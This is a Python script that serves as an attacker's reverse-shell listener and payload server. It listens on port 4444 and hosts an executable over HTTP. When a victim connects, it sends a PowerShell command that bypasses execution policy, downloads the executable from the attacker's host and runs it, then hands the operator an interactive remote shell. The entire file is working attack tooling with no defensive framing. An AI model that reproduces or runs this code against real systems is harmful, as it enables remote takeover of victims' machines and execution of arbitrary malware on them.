import socket
import threading
import sys
import http.server
import socketserver
import os

# Listening configuration
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

# File to deliver and web server config
FILE_NAME = "ADSB-hub_dump.exe"
PAYLOAD_FILENAME = "ADSB-hub_dump/x64/Debug/ADSB-hub_dump.exe"
WEB_SERVER_PORT = 8000

# Get host IP for the HTTP server
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't need to be reachable
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

# HTTP server in separate thread
def start_http_server():
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", WEB_SERVER_PORT), handler)
    print(f"[*] HTTP server running on port {WEB_SERVER_PORT}, sharing directory: {os.getcwd()}")
    httpd.serve_forever()

def handle_client(conn, addr, local_ip):
    print(f"[+] Shell connected: {addr[0]}:{addr[1]}")
    print("Type 'exit' to close the shell.")

    try:
        # Send command to download and run payload using PowerShell
        download_command = (
            f"powershell -ExecutionPolicy Bypass -NoProfile -Command "
            f"\"Invoke-WebRequest -Uri 'http://{local_ip}:{WEB_SERVER_PORT}/{PAYLOAD_FILENAME}' "
            f"-OutFile '{FILE_NAME}'; Start-Process '{FILE_NAME}'\"\n"
        )
        conn.sendall(download_command.encode())

        # Begin shell loop
        while True:
            try:
                command = input(f"{addr[0]}> ")
            except (KeyboardInterrupt, EOFError):
                print("\n[!] Interrupted. Closing connection.")
                conn.sendall(b"exit\n")
                break

            if command.strip().lower() == "exit":
                conn.sendall(b"exit\n")
                break

            conn.sendall((command + "\n").encode())

            conn.settimeout(1.0)
            response_parts = []
            while True:
                try:
                    part = conn.recv(4096)
                    if not part:
                        break
                    response_parts.append(part)
                except socket.timeout:
                    break
                except Exception as e:
                    print(f"[!] Error receiving data: {e}", file=sys.stderr)
                    break

            response = b"".join(response_parts).decode("utf-8", errors="ignore")
            print(response, end="")

    except Exception as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
    finally:
        print(f"[-] Disconnected: {addr[0]}:{addr[1]}")
        conn.close()

def start_listener(local_ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((LISTEN_IP, LISTEN_PORT))
        server_socket.listen()
        print(f"[*] Listening for shell connections on {LISTEN_IP}:{LISTEN_PORT}...")

        try:
            conn, addr = server_socket.accept()
            handle_client(conn, addr, local_ip)
        except KeyboardInterrupt:
            print("\n[*] Interrupted. Exiting cleanly.")

if __name__ == "__main__":
    # Detect local IP to embed in download command
    local_ip = get_local_ip()

    # Start HTTP server thread to share the payload
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()

    # Start reverse shell listener
    start_listener(local_ip)
